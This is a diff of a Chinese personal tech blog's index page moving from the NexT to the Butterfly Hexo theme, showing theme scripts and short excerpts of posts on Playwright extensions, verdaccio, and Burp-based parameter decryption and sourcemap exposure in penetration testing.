@@ -1,1684 +1,457 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"blog.xingxiaowu.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="一个么的前途的弟中弟">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>歪比巴卜 - 技术为辅,业务为主</title><meta name="author" content="无星"><meta name="copyright" content="无星"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="打工人">
 <meta property="og:type" content="website">
-<meta property="og:title" content="无星的小窝">
+<meta property="og:title" content="歪比巴卜">
 <meta property="og:url" content="http://blog.xingxiaowu.cn/page/2/index.html">
-<meta property="og:site_name" content="无星的小窝">
-<meta property="og:description" content="一个么的前途的弟中弟">
+<meta property="og:site_name" content="歪比巴卜">
+<meta property="og:description" content="打工人">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.xingxiaowu.cn/images/Avatar.jpg">
 <meta property="article:author" content="无星">
-<meta property="article:tag" content="无星">
+<meta property="article:tag" content="无星,歪比巴卜,阿巴阿巴">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://blog.xingxiaowu.cn/page/2/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>无星的小窝</title>
-  
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-5976024V60"></script>
-    <script>
-      if (CONFIG.hostname === location.hostname) {
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-5976024V60');
+<meta name="twitter:image" content="http://blog.xingxiaowu.cn/images/Avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/images/Avatar.jpg"><link rel="canonical" href="http://blog.xingxiaowu.cn/page/2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
       }
-    </script>
+    }
 
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?bdba6c3bda62a07f58f3cf06034704d5";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-<link rel="alternate" href="/rss2.xml" title="无星的小窝" type="application/rss+xml">
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-    <span id="forkongithub"><a target="_blank" rel="noopener" href="https://github.com/XingXiaoWu">我的GitHub</a></span>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">无星的小窝</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">技术为辅,业务为主</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-留言板">
-
-    <a href="/guestbook" rel="section"><i class="fab fa-leanpub fa-fw"></i>留言板</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/html/404.html" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result">
-  <div id="no-result">
-    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
-            
-      
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/" class="post-title-link" itemprop="url">无星的自动化之旅（七）——PlayWright加载插件</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-06-08 15:27:08" itemprop="dateCreated datePublished" datetime="2025-06-08T15:27:08+08:00">2025-06-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-07-31 15:15:55" itemprop="dateModified" datetime="2025-07-31T15:15:55+08:00">2025-07-31</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PlayWright/" itemprop="url" rel="index"><span itemprop="name">PlayWright</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/" class="post-meta-item leancloud_visitors" data-flag-title="无星的自动化之旅（七）——PlayWright加载插件" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>使用playwright启动的是为一个无痕浏览器</p>
-<p>但是我们有时候需要包含一些浏览器拓展</p>
-<h1 id="如何找到拓展安装地址"><a href="#如何找到拓展安装地址" class="headerlink" title="如何找到拓展安装地址"></a>如何找到拓展安装地址</h1><p>我这里以<code>Edge</code>为例，其他浏览器自己搜</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user_name\AppData\Local\Microsoft\Edge\User Data\Default\Extensions</span><br></pre></td></tr></table></figure>
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
 
-<p>所有插件都在其中</p>
-<p>可以根据拓展中展示的插件id知道插件名称</p>
-<h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><p>在当前项目下新建一个<code>extensions</code>文件夹</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
         
       
-    </div>
-
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
     
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
       
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
   
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/05/27/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94verdaccio%E8%A7%A3%E5%86%B3%E5%86%85%E7%BD%91%E4%BE%9D%E8%B5%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/05/27/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94verdaccio%E8%A7%A3%E5%86%B3%E5%86%85%E7%BD%91%E4%BE%9D%E8%B5%96/" class="post-title-link" itemprop="url">无星的前端之旅（三十四）——verdaccio解决内网依赖.md</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-05-27 18:24:00" itemprop="dateCreated datePublished" datetime="2025-05-27T18:24:00+08:00">2025-05-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-06 16:53:21" itemprop="dateModified" datetime="2025-06-06T16:53:21+08:00">2025-06-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%89%8D%E7%AB%AF/" itemprop="url" rel="index"><span itemprop="name">前端</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/05/27/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94verdaccio%E8%A7%A3%E5%86%B3%E5%86%85%E7%BD%91%E4%BE%9D%E8%B5%96/" class="post-meta-item leancloud_visitors" data-flag-title="无星的前端之旅（三十四）——verdaccio解决内网依赖.md" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>前面使用<code>playwright</code>时，就谈过这个内网依赖的问题，今天我将使用究极模式来解决这个问题</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>一台内网机，一台外网机</p>
-<p>内网机有<code>node</code>和<code>npm</code></p>
-<h1 id="1-自建私服"><a href="#1-自建私服" class="headerlink" title="1.自建私服"></a>1.自建私服</h1><p>使用<code>verdaccio</code>，这个大家应该都不陌生</p>
-<p>接下来，我会告诉你如何搭建一个私服，并让它可用</p>
-<p>因为考虑到我们是需要迁移到内网，所以我们拒绝全局安装</p>
-<p>这里我们不考虑什么打包<code>tgz</code>的方式</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/05/27/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94verdaccio%E8%A7%A3%E5%86%B3%E5%86%85%E7%BD%91%E4%BE%9D%E8%B5%96/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/05/18/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89-Burp%E5%8F%82%E6%95%B0%E5%8A%A0%E8%A7%A3%E5%AF%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/05/18/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89-Burp%E5%8F%82%E6%95%B0%E5%8A%A0%E8%A7%A3%E5%AF%86/" class="post-title-link" itemprop="url">无星的渗透之旅速成篇（十三）-Burp参数加解密</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-05-18 20:09:00" itemprop="dateCreated datePublished" datetime="2025-05-18T20:09:00+08:00">2025-05-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-08-15 11:39:08" itemprop="dateModified" datetime="2025-08-15T11:39:08+08:00">2025-08-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/05/18/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89-Burp%E5%8F%82%E6%95%B0%E5%8A%A0%E8%A7%A3%E5%AF%86/" class="post-meta-item leancloud_visitors" data-flag-title="无星的渗透之旅速成篇（十三）-Burp参数加解密" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>8.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>8 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在渗透过程中,经常会遇到参数和返回值加密的情况</p>
-<p>比如</p>
-<p>请求 和 返回如下<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F12/20250518181206201.png"></p>
-<h1 id="那么我们如何找寻加密方式和明文参数呢"><a href="#那么我们如何找寻加密方式和明文参数呢" class="headerlink" title="那么我们如何找寻加密方式和明文参数呢"></a>那么我们如何找寻加密方式和明文参数呢</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1. 代码审计"></a>1. 代码审计</h2><p>打开<code>F12</code>通过搜索查找接口所在代码位置</p>
-<p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F12/20250518181357830.png"></p>
-<p>自己添加一行打印并保存,就能看到明文参数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F12/20250518181833636.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/05/18/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89-Burp%E5%8F%82%E6%95%B0%E5%8A%A0%E8%A7%A3%E5%AF%86/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/05/17/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-sourcemap%E5%92%8C.git/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/05/17/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-sourcemap%E5%92%8C.git/" class="post-title-link" itemprop="url">无星的渗透之旅速成篇（十二）-sourcemap和.git</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-05-17 20:09:00" itemprop="dateCreated datePublished" datetime="2025-05-17T20:09:00+08:00">2025-05-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-07-31 15:15:55" itemprop="dateModified" datetime="2025-07-31T15:15:55+08:00">2025-07-31</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/05/17/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-sourcemap%E5%92%8C.git/" class="post-meta-item leancloud_visitors" data-flag-title="无星的渗透之旅速成篇（十二）-sourcemap和.git" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>406</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
